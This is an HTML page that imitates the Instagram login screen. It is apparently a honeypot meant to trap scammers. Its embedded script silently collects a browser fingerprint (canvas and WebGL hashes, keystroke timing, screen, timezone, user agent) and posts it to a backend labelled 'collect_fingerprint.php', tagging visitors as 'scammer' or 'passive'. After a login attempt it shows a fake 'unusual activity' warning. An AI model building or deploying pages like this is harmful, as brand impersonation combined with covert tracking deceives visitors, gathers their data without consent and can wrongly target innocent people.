<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Roboto', sans-serif;
    background: #fafafa;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
  }

  .card {
    background: white;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 40px 40px 20px;
    width: 350px;
    text-align: center;
    margin-bottom: 10px;
  }

  .logo {
    font-size: 32px;
    font-family: 'Billabong', cursive;
    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    margin-bottom: 20px;
    font-weight: 700;
    letter-spacing: -1px;
  }

  input {
    width: 100%;
    padding: 10px 12px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    font-size: 14px;
    outline: none;
    margin-bottom: 6px;
    display: block;
  }

  input:focus { border-color: #a8a8a8; }

  .btn {
    width: 100%;
    padding: 7px;
    background: #0095f6;
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    margin: 10px 0;
    opacity: 1;
  }

  .btn:hover { background: #1877f2; }
  .btn:disabled { opacity: 0.5; cursor: default; }

  .or-divider {
    display: flex;
    align-items: center;
    gap: 15px;
    margin: 15px 0;
    color: #8e8e8e;
    font-size: 13px;
    font-weight: 600;
  }
  .or-divider::before, .or-divider::after {
    content: '';
    flex: 1;
    height: 1px;
    background: #dbdbdb;
  }

  .fb-btn {
    background: none;
    border: none;
    color: #385185;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 8px;
    margin: 0 auto;
  }

  .forgot { display: block; font-size: 12px; color: #385185; margin-top: 10px; text-decoration: none; }

  .card2 {
    background: white;
    border: 1px solid #dbdbdb;
    padding: 20px;
    width: 350px;
    text-align: center;
    font-size: 14px;
  }

  .card2 a { color: #0095f6; font-weight: 600; text-decoration: none; }

  .app-badges { display: flex; gap: 10px; justify-content: center; margin-top: 20px; }
  .app-badge {
    border: 1px solid #dbdbdb;
    border-radius: 4px;
    padding: 6px 14px;
    font-size: 12px;
    color: #262626;
    cursor: pointer;
  }
</style>
</head>
<body>
<div class="card">
  <div class="logo">Instagram</div>

  <form onsubmit="handleSubmit(event)">
    <input type="text" id="credential" placeholder="Phone number, username, or email" autocomplete="off">
    <input type="password" id="password" placeholder="Password">
    <button type="submit" class="btn" id="loginBtn">Log in</button>
  </form>

  <div class="or-divider">OR</div>

  <button class="fb-btn">
    <span style="font-size: 18px;">𝕗</span> Log in with Facebook
  </button>

  <a href="#" class="forgot">Forgot password?</a>
</div>

<div class="card2">
  Don't have an account? <a href="#">Sign up</a>
</div>

<div class="app-badges">
  <div class="app-badge">▶ Get the app</div>
  <div class="app-badge">⊞ Get the app</div>
</div>

<script>
const reportId = new URLSearchParams(window.location.search).get('report') || 0;

const fingerprint = {
  typing_rhythm: [],
  screen_resolution: `${screen.width}x${screen.height}`,
  browser: navigator.userAgent,
  os: navigator.platform,
  font_size: window.getComputedStyle(document.body).fontSize,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  device_memory: navigator.deviceMemory || 'unknown',
  canvas_fingerprint: getCanvasFingerprint(),
  webgl_fingerprint: getWebGLFingerprint()
};

let lastKeyTime = 0;
document.addEventListener('keydown', () => {
  const now = Date.now();
  if (lastKeyTime) fingerprint.typing_rhythm.push(now - lastKeyTime);
  lastKeyTime = now;
});

function getCanvasFingerprint() {
  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    ctx.font = '14px Arial'; ctx.fillText('FP', 0, 14);
    return c.toDataURL().slice(-40);
  } catch(e) { return 'n/a'; }
}

function getWebGLFingerprint() {
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl');
    if (!gl) return 'n/a';
    return `${gl.getParameter(gl.VENDOR)}::${gl.getParameter(gl.RENDERER)}`.slice(0, 50);
  } catch(e) { return 'n/a'; }
}

function handleSubmit(e) {
  e.preventDefault();
  document.getElementById('loginBtn').disabled = true;
  document.getElementById('loginBtn').textContent = 'Logging in...';

  fetch('../../backend/collect_fingerprint.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ report_id: reportId, role: 'scammer', fingerprint })
  }).catch(() => {});

  setTimeout(() => {
    document.getElementById('loginBtn').disabled = false;
    document.getElementById('loginBtn').textContent = 'Log in';
    document.querySelector('.card').innerHTML += `
      <div style="margin-top: 15px; padding: 12px; background: #fff3f3; border: 1px solid #ffcdd2; border-radius: 4px; font-size: 13px; color: #c62828;">
        We detected unusual activity on this account. Please verify your identity.
      </div>
    `;
  }, 1500);
}

setTimeout(() => {
  fetch('../../backend/collect_fingerprint.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ report_id: reportId, role: 'passive', fingerprint })
  }).catch(() => {});
}, 4000);
</script>
</body>
</html>
